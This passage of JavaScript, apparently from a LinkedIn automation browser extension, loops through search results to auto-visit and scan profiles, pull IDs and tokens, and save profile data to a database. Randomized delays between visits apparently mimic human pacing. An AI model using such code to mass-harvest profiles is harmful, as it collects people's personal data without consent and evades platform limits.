                                if(response.match(/profileId:(.*?),/)){
                                    var temp_entityUrn = response.match(/profileId:(.*?),/)[1];
                                    if(temp_entityUrn.length == 39){
                                        entityUrn = temp_entityUrn;
                                    }
                                } else if(response.match(/sales\/.*?\/(.*?),/)){
                                    var temp_entityUrn = response.match(/sales\/.*?\/(.*?),/)[1];
                                    if(temp_entityUrn.length == 39){
                                        entityUrn = temp_entityUrn;
                                    }
                                }
                                var key_arr = view_url.replace(/.*?profile\//, '').split('?');
                                if(key_arr.length > 0){
                                    var profile_id = key_arr[0].split(',')[0];
                                    authToken = key_arr[0].split(',')[1];
                                    authType = key_arr[0].split(',')[2];
                                    if(key_arr.length > 0){
                                        var key_obj = key_arr[1].split('&');
                                        key_obj.forEach(function(k) {
                                            switch (k.split('=')[0]) {
                                                case 'moduleKey':
                                                    moduleKey = k.split('=')[1] || 'peopleSearchResults';
                                                    break;
                                                case 'pageKey':
                                                    pageKey = k.split('=')[1] || 'sales-search3-saved-search-delta';
                                                    break;
                                                case 'contextId':
                                                    contextId = k.split('=')[1];
                                                    break;
                                                case 'requestId':
                                                    requestId = k.split('=')[1];
                                                    break;
                                                case 'pageNumber':
                                                    pageNumber = k.split('=')[1];
                                                    break;
                                            }
                                        });
                                    }
                                }
                            }
                            var view_tags = $('#view_tags option:selected').length > 0 ? $('#view_tags option:selected').map(function() {
                                return $(this).text();
                            }).toArray().join(',') : '';
                            if (view_tags == "" && local_data.selectedTags.length > 0) {
                                var view_tags_arr = [];
                                tags.forEach(function(t) {
                                    if(local_data.selectedTags.indexOf(t.id) > -1){
                                        view_tags_arr.push(t.tag_name);
                                    }
                                });
                                view_tags = view_tags_arr.join(',');
                            }
                            if(isSalesNav && (entityUrn.length != 39 || !entityUrn)){
                                if(response.match(/sales\/.*?\/(.*?),/)){
                                    entityUrn = response.match(/sales\/.*?\/(.*?),/)[1];
                                } else if(response.match(/profileId:(.*?),/)){
                                    entityUrn = response.match(/profileId:(.*?),/)[1];
                                }
                            }
                            visitProfile(entityUrn, function(attrs){
                                if(attrs){
                                    attrs.moduleKey = moduleKey;
                                    attrs.pageKey = pageKey;
                                    attrs.contextId = contextId;
                                    attrs.requestId = requestId;
                                    attrs.pageNumber = pageNumber;
                                    attrs.authToken = authToken;
                                    attrs.authType = authType;

                                    attrs.tags = view_tags;
                                    if(attrs.tags){
                                        chrome.runtime.sendMessage({
                                            obj: attrs,
                                            saveTags: true
                                        }, function(){
                                            
                                        });
                                    }
                                    finished_in_remaining++;
                                    local_data.currentIdx++;
                                    currentIdx++;
                                    local_data.REMAINING_PROFILE_VIEWS--;
                                    if (local_data.rpv <= finished_in_remaining || local_data.REMAINING_PROFILE_VIEWS <= 0) {
                                        clearInterval(nextViewInter);
                                        nextViewInter = null;
                                        clearTimeout(nextViewTimer);
                                        nextViewTimer = null;
                                        chrome.storage.local.set({
                                            nextPageRedirect: false
                                        });
                                        $("#start_viewing").text("START");
                                        $("#start_viewing").removeClass("started");
                                        saveViewToDB(attrs, function(error) {
                                            if(error == 'error'){
                                                cont_div.addClass("leo_visit_error");
                                                cont_div.find(".time_rem_span").remove();
                                                cont_div.find(".search-result__actions").prepend($('<span />', {
                                                    'class': 'time_rem_span'
                                                }).text(local_strings['UNABLE_TO_VIEW']));
                                                if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                                    cont_div.find(".content-wrapper").prepend($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['UNABLE_TO_VIEW']));
                                                } else if (cont_div.find(".bd").length > 0) {
                                                    cont_div.find(".bd").prepend($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['UNABLE_TO_VIEW']));
                                                } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                                    cont_div.find(".result-lockup__actions").append($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['UNABLE_TO_VIEW']));
                                                }
                                                currentIdx++;
                                                local_data.frame_id && $("#"+local_data.frame_id).remove();
                                                startViewing(currentIdx);
                                            } else {
                                                updateLocalData(function() {
                                                    currentIdx = 0;
                                                    chrome.runtime.sendMessage({
                                                        removeBadge: true
                                                    })
                                                    // local_data.startedViewing = false;
                                                    local_data.rpv = local_data.REMAINING_PROFILE_VIEWS;
                                                    // showNotification(local_strings['PROFILE_VIEW_COMPLETE_1'] + finished_in_remaining + local_strings['PROFILE_VIEW_COMPLETE_2']);
                                                    notifyUser(local_strings['PROFILE_VIEW_COMPLETE_1'] + finished_in_remaining + local_strings['PROFILE_VIEW_COMPLETE_2']);
                                                    cont_div.find(".time_rem_span").text(local_strings['VISITED']);
                                                    cont_div.removeClass("leo_visiting").addClass("leo_visited");
                                                    updateLocalData();
                                                    setStopLeonardBtn(false);
                                                    stopLeonard(false);
                                                });
                                            }
                                        })
                                        return false;
                                    } else {
                                        saveViewToDB(attrs, function(error) {
                                            if(error == 'error'){
                                                cont_div.addClass("leo_visit_error");
                                                cont_div.find(".time_rem_span").remove();
                                                cont_div.find(".search-result__actions").prepend($('<span />', {
                                                    'class': 'time_rem_span'
                                                }).text(local_strings['UNABLE_TO_VIEW']));
                                                if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                                    cont_div.find(".content-wrapper").prepend($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['UNABLE_TO_VIEW']));
                                                } else if (cont_div.find(".bd").length > 0) {
                                                    cont_div.find(".bd").prepend($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['UNABLE_TO_VIEW']));
                                                } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                                    cont_div.find(".result-lockup__actions").append($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['UNABLE_TO_VIEW']));
                                                }
                                                currentIdx++;
                                                local_data.frame_id && $("#"+local_data.frame_id).remove();
                                                startViewing(currentIdx);
                                                return false;
                                            } else {
                                                var RANDOM_TIMER = randomInRange(MIN_TIME_TO_NEXT, MAX_TIME_TO_NEXT);
                                                updateLocalData(function() {
                                                    var end_timer = Date.now() + RANDOM_TIMER;
                                                    if (nextViewInter) {
                                                        clearInterval(nextViewInter);
                                                        nextViewInter = null;
                                                    }
                                                    nextViewInter = setInterval(function() {
                                                        if (!local_data.startedViewing || ($("#start_viewing").length > 0 && !$("#start_viewing").hasClass("started"))) {
                                                            clearTimeout(nextViewInter);
                                                            nextViewInter = null;
                                                            return false;
                                                        }
                                                        var end_time = Math.round((end_timer - Date.now()) / 1000);
                                                        if (end_time < 1) {
                                                            clearInterval(nextViewInter);
                                                            nextViewInter = null;
                                                        }
                                                        if (viewPremiumOnly) {
                                                            while (cont_div.find(".premium-icon, .premiumicon, .linkedin-premium-icon, .m-type--premium").length == 0 && currentIdx <= search_records_count) {
                                                                if(leonard_stopped){
                                                                    break;
                                                                }
                                                                currentIdx++;
                                                                cont_div = $(".results-list > li").eq(currentIdx);
                                                                if ($("#results").length > 0) {
                                                                    cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                                                                } else if ($("#results-list").length > 0) {
                                                                    cont_div = $("#results-list > li").eq(currentIdx);
                                                                }
                                                                if(cont_div.length == 0){
                                                                    cont_div = $(".search-results__list > li").eq(currentIdx);
                                                                }
                                                                if(cont_div.length == 0 && isSalesNav){
                                                                    cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                                                                }
                                                                // if($(".search-results li.search-result").length > 0){
                                                                //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                                                                // }
                                                                if(cont_div.next().hasClass("search-result__occlusion-hint")){
                                                                    var elOffset = cont_div.offset().top;
                                                                    var elHeight = cont_div.height();
                                                                    var windowHeight = $(window).height();
                                                                    var offset;
                                                                    if (elHeight < windowHeight) {
                                                                        offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                                                                    } else {
                                                                        offset = elOffset;
                                                                    }
                                                                    $('html, body').animate({
                                                                        scrollTop: offset
                                                                    }, 100);
                                                                    local_data.frame_id && $("#"+local_data.frame_id).remove();
                                                                    setTimeout(startViewing, 1000);
                                                                    return false;
                                                                }
                                                            }
                                                            if(leonard_stopped){
                                                                stopLeonard();
                                                                return false;
                                                            }
                                                        }
                                                        if (skipProfileWithNoPicVisit) {
                                                            while ((cont_div.find(".search-result__image img, .result-lockup__icon-link img").hasClass('ghost-person') || cont_div.find(".person-ghost").length > 0 || cont_div.find(".search-result__image-wrapper .ghost-person").length > 0) && currentIdx <= search_records_count) {
                                                                if(leonard_stopped){
                                                                    break;
                                                                }
                                                                currentIdx++;
                                                                cont_div = $(".results-list > li").eq(currentIdx);
                                                                if ($("#results").length > 0) {
                                                                    cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                                                                } else if ($("#results-list").length > 0) {
                                                                    cont_div = $("#results-list > li").eq(currentIdx);
                                                                }
                                                                if(cont_div.length == 0){
                                                                    cont_div = $(".search-results__list > li").eq(currentIdx);
                                                                }
                                                                if(cont_div.length == 0 && isSalesNav){
                                                                    cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                                                                }
                                                                // if($(".search-results li.search-result").length > 0){
                                                                //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                                                                // }
                                                                if(cont_div.next().hasClass("search-result__occlusion-hint")){
                                                                    var elOffset = cont_div.offset().top;
                                                                    var elHeight = cont_div.height();
                                                                    var windowHeight = $(window).height();
                                                                    var offset;
                                                                    if (elHeight < windowHeight) {
                                                                        offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                                                                    } else {
                                                                        offset = elOffset;
                                                                    }
                                                                    $('html, body').animate({
                                                                        scrollTop: offset
                                                                    }, 100);
                                                                    setTimeout(startViewing, 1000);
                                                                    return false;
                                                                }
                                                            }
                                                            if(leonard_stopped){
                                                                stopLeonard();
                                                                return false
                                                            }
                                                        }
                                                        end_time = end_time + " secs";
                                                        cont_div.addClass("leo_visiting");
                                                        cont_div.find(".time_rem_span").remove();
                                                        cont_div.find(".search-result__actions").prepend($('<span />', {
                                                            'class': 'time_rem_span'
                                                        }).text(local_strings['VISITING_IN'] + end_time));
                                                        if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                                            cont_div.find(".content-wrapper").prepend($('<span />', {
                                                                'class': 'time_rem_span'
                                                            }).text(local_strings['VISITING_IN'] + end_time));
                                                        } else if (cont_div.find(".bd").length > 0) {
                                                            cont_div.find(".bd").prepend($('<span />', {
                                                                'class': 'time_rem_span'
                                                            }).text(local_strings['VISITING_IN'] + end_time));
                                                        } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                                            cont_div.find(".result-lockup__actions").append($('<span />', {
                                                                'class': 'time_rem_span'
                                                            }).text(local_strings['VISITING_IN'] + end_time));
                                                        }
                                                    }, 1000);
                                                    if (nextViewTimer) {
                                                        clearTimeout(nextViewTimer);
                                                        nextViewTimer = null;
                                                    }
                                                    nextViewTimer = setTimeout(function() {
                                                        cont_div.find(".time_rem_span").remove();
                                                        cont_div.removeClass("leo_visiting").addClass("leo_visited");
                                                        cont_div.find(".search-result__actions").prepend($('<span />', {
                                                            'class': 'time_rem_span'
                                                        }).text(local_strings['VISITED']));
                                                        if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                                            cont_div.find(".content-wrapper").prepend($('<span />', {
                                                                'class': 'time_rem_span'
                                                            }).text(local_strings['VISITED']));
                                                        } else if (cont_div.find(".bd").length > 0) {
                                                            cont_div.find(".bd").prepend($('<span />', {
                                                                'class': 'time_rem_span'
                                                            }).text(local_strings['VISITED']));
                                                        } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                                            cont_div.find(".result-lockup__actions").append($('<span />', {
                                                                'class': 'time_rem_span'
                                                            }).text(local_strings['VISITED']));
                                                        }
                                                        chrome.runtime.sendMessage({
                                                            setBadge: finished_in_remaining.toString(),
                                                            mode: 'view'
                                                        });
                                                        if (!local_data.startedViewing || ($("#start_viewing").length > 0 && !$("#start_viewing").hasClass("started"))) {
                                                            clearTimeout(nextViewTimer);
                                                            nextViewTimer = null;
                                                            return false;
                                                        }
                                                        clearInterval(nextViewInter);
                                                        nextViewInter = null;
                                                        local_data.frame_id && $("#"+local_data.frame_id).remove();
                                                        startViewing(currentIdx);
                                                    }, RANDOM_TIMER);
                                                })
                                            }
                                        })
                                    }
                                } else {
                                    cont_div.addClass("leo_visit_error");
                                    cont_div.find(".time_rem_span").remove();
                                    cont_div.find(".search-result__actions").prepend($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['UNABLE_TO_VIEW']));
                                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                        cont_div.find(".content-wrapper").prepend($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['UNABLE_TO_VIEW']));
                                    } else if (cont_div.find(".bd").length > 0) {
                                        cont_div.find(".bd").prepend($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['UNABLE_TO_VIEW']));
                                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                        cont_div.find(".result-lockup__actions").append($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['UNABLE_TO_VIEW']));
                                    }
                                    currentIdx++;
                                    local_data.frame_id && $("#"+local_data.frame_id).remove();
                                    startViewing(currentIdx);
                                    return false;
                                }
                            })
                        }
                    });
                }
            });
        });
    })
}

function startScanning() {
    if(Object.keys(objectUrnsToEntityUrns).length == 0){
        mapObjectUrns();
    }
    if (search_records_count < 1) {
        setupExtensionVars(function() {
            startScanning();
        });
        return false;
    }
    // local_data.rpv = local_data.REMAINING_PROFILE_VIEWS;
    setupExtensionVars(function() {
        updateLocalData(function() {
            var cont_div = $(".results-list > li").eq(currentIdx);
            if (isSalesNav) {
                cont_div = $("#results-list > li").eq(currentIdx);
            }
            if(cont_div.length == 0){
                cont_div = $(".search-results__list > li").eq(currentIdx);
            }
            if(cont_div.length == 0 && isSalesNav){
                cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
            }
            // if($(".search-results li.search-result").length > 0){
            //     cont_div = $(".search-results li.search-result").eq(currentIdx);
            // }
            if (scanPremiumOnly) {
                while (cont_div.find(".premium-icon, .premiumicon, .linkedin-premium-icon, .m-type--premium").length == 0 && currentIdx <= search_records_count) {
                    if(leonard_stopped){
                        break;
                    }
                    currentIdx++;
                    cont_div = $(".results-list > li").eq(currentIdx);
                    if ($("#results").length > 0) {
                        cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                    } else if ($("#results-list").length > 0) {
                        cont_div = $("#results-list > li").eq(currentIdx);
                    }
                    if(cont_div.length == 0){
                        cont_div = $(".search-results__list > li").eq(currentIdx);
                    }
                    if(cont_div.length == 0 && isSalesNav){
                        cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                    }
                    // if($(".search-results li.search-result").length > 0){
                    //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                    // }
                    if(cont_div.next().hasClass("search-result__occlusion-hint")){
                        var elOffset = cont_div.offset().top;
                        var elHeight = cont_div.height();
                        var windowHeight = $(window).height();
                        var offset;
                        if (elHeight < windowHeight) {
                            offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                        } else {
                            offset = elOffset;
                        }
                        $('html, body').animate({
                            scrollTop: offset
                        }, 100);
                        setTimeout(startScanning, 1000);
                        return false;
                    }
                }
                if(leonard_stopped){
                    stopLeonard();
                    return false
                }
            }
            if (skipProfileWithNoPicScan) {
                while ((cont_div.find(".search-result__image img").hasClass('ghost-person') || cont_div.find(".person-ghost").length > 0 || cont_div.find(".search-result__image-wrapper .ghost-person").length > 0) && currentIdx <= search_records_count) {
                    if(leonard_stopped){
                        break;
                    }
                    currentIdx++;
                    cont_div = $(".results-list > li").eq(currentIdx);
                    if ($("#results").length > 0) {
                        cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                    } else if ($("#results-list").length > 0) {
                        cont_div = $("#results-list > li").eq(currentIdx);
                    }
                    if(cont_div.length == 0){
                        cont_div = $(".search-results__list > li").eq(currentIdx);
                    }
                    if(cont_div.length == 0 && isSalesNav){
                        cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                    }
                    // if($(".search-results li.search-result").length > 0){
                    //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                    // }
                    if(cont_div.next().hasClass("search-result__occlusion-hint")){
                        var elOffset = cont_div.offset().top;
                        var elHeight = cont_div.height();
                        var windowHeight = $(window).height();
                        var offset;
                        if (elHeight < windowHeight) {
                            offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                        } else {
                            offset = elOffset;
                        }
                        $('html, body').animate({
                            scrollTop: offset
                        }, 100);
                        setTimeout(startScanning, 1000);
                        return false;
                    }
                }
                if(leonard_stopped){
                    stopLeonard();
                    return false
                }
            }
            if ((cont_div.length == 0 && finished_in_remaining > 0) || currentIdx > search_records_count - 1) {
                chrome.storage.local.set({
                    nextPageRedirect: {
                        count: finished_in_remaining
                    }
                }, function() {
                    if ($(".next").length > 0) {
                        $(".next").trigger('click')
                    } else if ($(".next a").length > 0) {
                        window.location.href = location.origin + $(".next a").attr("href");
                    } else if (isSalesNav && $(".next-pagination").length > 0) {
                        $(".next-pagination")[0].click();
                    } else if (isSalesNav && $(".search-results__pagination-next-button").length > 0) {
                        $(".search-results__pagination-next-button").click();
                    } else {
                        showNotification(local_strings['NO_PROFILES_TO_SCAN']);
                        downloadCSVIfEnabled();
                        stopLeonard();
                        return false;
                    }
                    startNextPageTimer('scan');
                });
                return false;
            }
            if (cont_div.length == 0 || (!isSalesNav && cont_div.find("div > a:first").length == 0) || (isSalesNav && cont_div.find(".result-lockup__name").length > 0 && cont_div.find(".result-lockup__name a").length == 0)) {
                activateThisTab(function() {
                    setTimeout(function() {
                        $("#start_scanning").text("STOP");
                        $("#start_scanning").addClass("started");
                        setStopLeonardBtn(true);
                        leonard_stopped = false;
                        startScanning();
                    }, 1000);
                })
                // showNotification(local_strings['ACTIVATE_LINKEDIN']);
                stopLeonard(true);
                return false;
            }
            var elOffset = cont_div.offset().top;
            var elHeight = cont_div.height();
            var windowHeight = $(window).height();
            var offset;
            if (elHeight < windowHeight) {
                offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
            } else {
                offset = elOffset;
            }
            $('html, body').animate({
                scrollTop: offset
            }, 100);
            /* code for scrolling into view (ember bug)*/
            if (cont_div.hasClass("search-result__occlusion-hint")) {
                setTimeout(startScanning, 1000);
                return false;
            }
            if(cont_div.find(".search-result__actions").length == 0 && cont_div.find(".content-wrapper").length == 0 && cont_div.find(".bd").length == 0 && cont_div.find(".result-lockup__actions").length == 0){
                currentIdx++;
                startScanning(currentIdx);
                return false;
            }
            var entityUrn, profile_link;
            if(cont_div.find("div > a:first").length > 0){
                entityUrn = cont_div.find("div > a:first").attr("href").slice(4, -1);
                profile_link = cont_div.find("div > a:first").attr("href");
            } else if(cont_div.find(".result-lockup__name a").length > 0){
                profile_link = cont_div.find(".result-lockup__name a").attr("href");
            }
            if(profile_link){
                var entityUrnMatch = profile_link.match(/sales\/.*?\/(.*?),/);
                if(entityUrnMatch && entityUrnMatch.length > 0){
                    entityUrn = profile_link.match(/sales\/.*?\/(.*?),/)[1];
                }
            }
            var tracking_id = cont_div.find("div > a").attr("data-control-id");
            var member_id;
            var view_url = cont_div.find("div > a:first").attr("href");
            if (isSalesNav) {
                view_url = cont_div.find("a.name-link").length > 0 && cont_div.find("a.name-link")[0].href;
                if(!view_url){
                    view_url = cont_div.find(".result-lockup__name a").attr("href");
                }
                member_id = cont_div.find("[name=memberId]").val();
            } else {
                if (idUrnMapObj[tracking_id] && idUrnMapObj[tracking_id].member_id) {
                    member_id = idUrnMapObj[tracking_id].member_id.slice(14);
                }
            }
            if (view_url.indexOf('www.linkedin.com') == -1) {
                view_url = 'https://www.linkedin.com' + view_url;
            }
            // var view_found_idx;
            // if (!views) {
            //     setTimeout(function() {
            //         showNotification(local_strings['REQ_SERVER']);
            //         startScanning();
            //     }, 3000);
            //     return false;
            // }
            // views.forEach(function(view, idx) {
            //     if( ( view.entityUrn == entityUrn ) || 
            //         ( view.viewed_linkedin_profile_id == entityUrn ) || 
            //         ( view.member_id == member_id && member_id ) ){
            //         view_found_idx = idx;
            //     }
            // });
            cont_div.find(".time_rem_span").remove();
            if(isProfileSkipped(entityUrn) || isProfileSkipped(member_id)){
                cont_div.find(".search-result__actions").prepend($('<span />', {
                    'class': 'time_rem_span'
                }).text(local_strings['SKIPPED']));
                if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                    cont_div.find(".content-wrapper").prepend($('<span />', {
                        'class': 'time_rem_span'
                    }).text(local_strings['SKIPPED']));
                } else if (cont_div.find(".bd").length > 0) {
                    cont_div.find(".bd").prepend($('<span />', {
                        'class': 'time_rem_span'
                    }).text(local_strings['SKIPPED']));
                } else if(cont_div.find(".result-lockup__actions").length > 0) {
                    cont_div.find(".result-lockup__actions").append($('<span />', {
                        'class': 'time_rem_span'
                    }).text(local_strings['SKIPPED']));
                }
                cont_div.addClass("leo_skipped");
                currentIdx++;
                startScanning(currentIdx);
            } else {
                cont_div.find(".time_rem_span").remove();
                cont_div.addClass("leo_visiting");
                cont_div.find(".search-result__actions").prepend($('<span />', {
                    'class': 'time_rem_span'
                }).text(local_strings['SCANNING']));
                if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                    cont_div.find(".content-wrapper").prepend($('<span />', {
                        'class': 'time_rem_span'
                    }).text(local_strings['SCANNING']));
                } else if (cont_div.find(".bd").length > 0) {
                    cont_div.find(".bd").prepend($('<span />', {
                        'class': 'time_rem_span'
                    }).text(local_strings['SCANNING']));
                } else if(cont_div.find(".result-lockup__actions").length > 0) {
                    cont_div.find(".result-lockup__actions").append($('<span />', {
                        'class': 'time_rem_span'
                    }).text(local_strings['SCANNING']));
                }
                if(isSalesNav && !entityUrn){
                    entityUrn = objectUrnsToEntityUrns[member_id];
                }
                var scan_tags = $('#scan_tags option:selected').length > 0 ? $('#scan_tags option:selected').map(function() {
                    return $(this).text();
                }).toArray().join(',') : '';
                if (scan_tags == "" && local_data.selectedTags.length > 0) {
                    var scan_tags_arr = [];
                    tags.forEach(function(t) {
                        if(local_data.selectedTags.indexOf(t.id) > -1){
                            scan_tags_arr.push(t.tag_name);
                        }
                    });
                    scan_tags = scan_tags_arr.join(',');
                }
                visitProfile(entityUrn, function(attrs){
                    if(attrs){
                        attrs.tags = scan_tags;
                        if(attrs.tags){
                            chrome.runtime.sendMessage({
                                obj: attrs,
                                saveTags: true
                            }, function(){
                                
                            });
                        }
                        finished_in_remaining++;
                        local_data.currentIdx++;
                        currentIdx++;
                        local_data.REMAINING_PROFILE_VIEWS--;
                        if (local_data.rpv <= finished_in_remaining || local_data.REMAINING_PROFILE_VIEWS <= 0) {
                            clearInterval(nextViewInter);
                            nextViewInter = null;
                            clearTimeout(nextViewTimer);
                            nextViewTimer = null;
                            chrome.storage.local.set({
                                nextPageRedirect: false
                            });
                            $("#start_scanning").text("START");
                            $("#start_scanning").removeClass("started");
                            saveViewToDB(attrs, function(error) {
                                if(error == 'error'){
                                    cont_div.addClass("leo_visit_error");
                                    cont_div.find(".time_rem_span").remove();
                                    cont_div.find(".search-result__actions").prepend($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['UNABLE_TO_SCAN']));
                                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                        cont_div.find(".content-wrapper").prepend($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['UNABLE_TO_SCAN']));
                                    } else if (cont_div.find(".bd").length > 0) {
                                        cont_div.find(".bd").prepend($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['UNABLE_TO_SCAN']));
                                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                        cont_div.find(".result-lockup__actions").append($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['UNABLE_TO_SCAN']));
                                    }
                                    currentIdx++;
                                    startScanning(currentIdx);
                                } else {
                                    updateLocalData(function() {
                                        currentIdx = 0;
                                        chrome.runtime.sendMessage({
                                            removeBadge: true
                                        })
                                        // local_data.startedViewing = false;
                                        local_data.rpv = local_data.REMAINING_PROFILE_VIEWS;
                                        // showNotification(local_strings['PROFILE_VIEW_COMPLETE_1'] + finished_in_remaining + local_strings['PROFILE_VIEW_COMPLETE_2']);
                                        notifyUser(local_strings['PROFILE_SCAN_COMPLETE_1'] + finished_in_remaining + local_strings['PROFILE_SCAN_COMPLETE_2']);
                                        cont_div.find(".time_rem_span").text(local_strings['SCANNED']);
                                        cont_div.removeClass("leo_visiting").addClass("leo_visited");
                                        updateLocalData();
                                        setStopLeonardBtn(false);
                                        stopLeonard(false);
                                    });
                                }
                            })
                            return false;
                        } else {
                            saveViewToDB(attrs, function(error) {
                                if(error == 'error'){
                                    cont_div.addClass("leo_visit_error");
                                    cont_div.find(".time_rem_span").remove();
                                    cont_div.find(".search-result__actions").prepend($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['UNABLE_TO_SCAN']));
                                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                        cont_div.find(".content-wrapper").prepend($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['UNABLE_TO_SCAN']));
                                    } else if (cont_div.find(".bd").length > 0) {
                                        cont_div.find(".bd").prepend($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['UNABLE_TO_SCAN']));
                                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                        cont_div.find(".result-lockup__actions").append($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['UNABLE_TO_SCAN']));
                                    }
                                    currentIdx++;
                                    startScanning(currentIdx);
                                    return false;
                                } else {
                                    var RANDOM_TIMER = 0;  // randomInRange(MIN_TIME_TO_NEXT, MAX_TIME_TO_NEXT)
                                    updateLocalData(function() {
                                        var end_timer = Date.now() + RANDOM_TIMER;
                                        if (nextViewInter) {
                                            clearInterval(nextViewInter);
                                            nextViewInter = null;
                                        }
                                        nextViewInter = setInterval(function() {
                                            if (!local_data.startedScanning || ($("#start_scanning").length > 0 && !$("#start_scanning").hasClass("started"))) {
                                                clearTimeout(nextViewInter);
                                                nextViewInter = null;
                                                return false;
                                            }
                                            var end_time = Math.round((end_timer - Date.now()) / 1000);
                                            if (end_time < 1) {
                                                clearInterval(nextViewInter);
                                                nextViewInter = null;
                                            }
                                            if (scanPremiumOnly) {
                                                while (cont_div.find(".premium-icon, .premiumicon, .linkedin-premium-icon, .m-type--premium").length == 0 && currentIdx <= search_records_count) {
                                                    if(leonard_stopped){
                                                        break;
                                                    }
                                                    currentIdx++;
                                                    cont_div = $(".results-list > li").eq(currentIdx);
                                                    if ($("#results").length > 0) {
                                                        cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                                                    } else if ($("#results-list").length > 0) {
                                                        cont_div = $("#results-list > li").eq(currentIdx);
                                                    }
                                                    if(cont_div.length == 0){
                                                        cont_div = $(".search-results__list > li").eq(currentIdx);
                                                    }
                                                    if(cont_div.length == 0 && isSalesNav){
                                                        cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                                                    }
                                                    // if($(".search-results li.search-result").length > 0){
                                                    //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                                                    // }
                                                    if(cont_div.next().hasClass("search-result__occlusion-hint")){
                                                        var elOffset = cont_div.offset().top;
                                                        var elHeight = cont_div.height();
                                                        var windowHeight = $(window).height();
                                                        var offset;
                                                        if (elHeight < windowHeight) {
                                                            offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                                                        } else {
                                                            offset = elOffset;
                                                        }
                                                        $('html, body').animate({
                                                            scrollTop: offset
                                                        }, 100);
                                                        setTimeout(startScanning, 1000);
                                                        return false;
                                                    }
                                                }
                                                if(leonard_stopped){
                                                    stopLeonard();
                                                    return false;
                                                }
                                            }
                                            if (skipProfileWithNoPicScan) {
                                                while ((cont_div.find(".search-result__image img").hasClass('ghost-person') || cont_div.find(".person-ghost").length > 0 || cont_div.find(".search-result__image-wrapper .ghost-person").length > 0) && currentIdx <= search_records_count) {
                                                    if(leonard_stopped){
                                                        break;
                                                    }
                                                    currentIdx++;
                                                    cont_div = $(".results-list > li").eq(currentIdx);
                                                    if ($("#results").length > 0) {
                                                        cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                                                    } else if ($("#results-list").length > 0) {
                                                        cont_div = $("#results-list > li").eq(currentIdx);
                                                    }
                                                    if(cont_div.length == 0){
                                                        cont_div = $(".search-results__list > li").eq(currentIdx);
                                                    }
                                                    if(cont_div.length == 0 && isSalesNav){
                                                        cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                                                    }
                                                    // if($(".search-results li.search-result").length > 0){
                                                    //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                                                    // }
                                                    if(cont_div.next().hasClass("search-result__occlusion-hint")){
                                                        var elOffset = cont_div.offset().top;
                                                        var elHeight = cont_div.height();
                                                        var windowHeight = $(window).height();
                                                        var offset;
                                                        if (elHeight < windowHeight) {
                                                            offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                                                        } else {
                                                            offset = elOffset;
                                                        }
                                                        $('html, body').animate({
                                                            scrollTop: offset
                                                        }, 100);
                                                        setTimeout(startScanning, 1000);
                                                        return false;
                                                    }
                                                }
                                                if(leonard_stopped){
                                                    stopLeonard();
                                                    return false
                                                }
                                            }
                                            end_time = end_time + " secs";
                                            cont_div.addClass("leo_visiting");
                                            cont_div.find(".time_rem_span").remove();
                                            cont_div.find(".search-result__actions").prepend($('<span />', {
                                                'class': 'time_rem_span'
